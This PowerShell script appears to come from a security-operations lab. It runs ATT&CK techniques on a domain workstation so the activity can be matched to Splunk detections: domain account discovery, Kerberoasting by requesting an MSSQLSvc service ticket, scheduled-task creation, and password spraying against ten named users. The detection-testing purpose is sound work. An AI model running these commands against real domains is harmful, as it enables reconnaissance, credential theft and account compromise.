# Runs INSIDE WS01 (domain-joined Windows 11) as a domain user, via guestcontrol.
# Executes the "from a workstation" ATT&CK techniques with self-contained tooling (no mimikatz,
# so Defender does not interfere): Kerberoasting, Account Discovery, Scheduled Task, Password Spray.
# DCSync and Pass-the-Hash are run separately from the Linux attacker host (run-impacket.sh).
# Each action prints a banner so the timeline can be matched to the Splunk detections.
$ErrorActionPreference = 'Continue'
function Banner($id,$name){ Write-Output ("=== {0}  {1}  {2} ===" -f (Get-Date -f 'HH:mm:ss'), $id, $name) }

# --- T1087.002  Account Discovery: Domain Account ---
Banner 'T1087.002' 'Account Discovery'
cmd /c "net user /domain"            | Out-Null
cmd /c "net group `"Domain Admins`" /domain" | Out-Null
cmd /c "net accounts /domain"        | Out-Null
nltest /dclist:soclab.local          | Out-Null

# --- T1558.003  Kerberoasting: request an RC4 service ticket for the svc_sql SPN via pure .NET ---
Banner 'T1558.003' 'Kerberoasting (TGS request for MSSQLSvc SPN)'
Add-Type -AssemblyName System.IdentityModel
try {
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/dc01.soclab.local:1433' | Out-Null
} catch { Write-Output "  TGS request issued (or error: $($_.Exception.Message))" }

# --- T1053.005  Scheduled Task persistence (created in the current user's context) ---
Banner 'T1053.005' 'Scheduled Task creation'
schtasks /create /tn "ATOMIC-T1053" /tr "cmd.exe /c calc.exe" /sc daily /st 09:00 /f | Out-Null
schtasks /delete /tn "ATOMIC-T1053" /f | Out-Null

# --- T1110.003  Password Spraying: one password across many domain users ---
# Uses the domain user list; a deliberately-wrong password so accounts are not actually changed.
Banner 'T1110.003' 'Password Spraying'
$targets = 'jsmith','agarcia','bchen','dkumar','efoster','mokafor','pnguyen','rlopez','twilson','ysato'
$bad = 'Spray-Autumn2026!'
foreach ($u in $targets) {
    Start-Process cmd -ArgumentList "/c net use \\dc01.soclab.local\IPC$ /user:soclab\$u $bad" -WindowStyle Hidden -Wait
}
cmd /c "net use * /delete /y" 2>$null | Out-Null

Write-Output "=== WS01 atomic techniques complete ==="
